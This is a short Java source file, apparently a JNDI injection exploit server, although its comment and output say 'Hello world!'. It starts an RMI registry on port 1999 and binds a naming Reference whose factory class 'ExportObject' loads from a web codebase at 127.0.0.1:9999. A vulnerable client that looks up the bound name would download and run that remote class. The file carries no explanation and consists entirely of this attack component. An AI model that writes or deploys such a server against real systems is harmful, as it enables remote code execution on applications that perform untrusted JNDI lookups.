package spring;

import java.lang.ref.Reference;
import java.rmi.RemoteException;
import java.rmi.registry.LocateRegistry;
import java.rmi.registry.Registry;

import javax.naming.RefAddr;

/**
 * Hello world!
 *
 */
public class App 
{
    public static void main( String[] args ) throws RemoteException
    {
        Registry registry = LocateRegistry.createRegistry(1999);
        javax.naming.Reference reference = new javax.naming.Reference("ExportObject","ExportObject","http://127.0.0.1:9999/");
        registry.bind("Object",reference);
        System.out.println( "Hello World!" );
    }
}
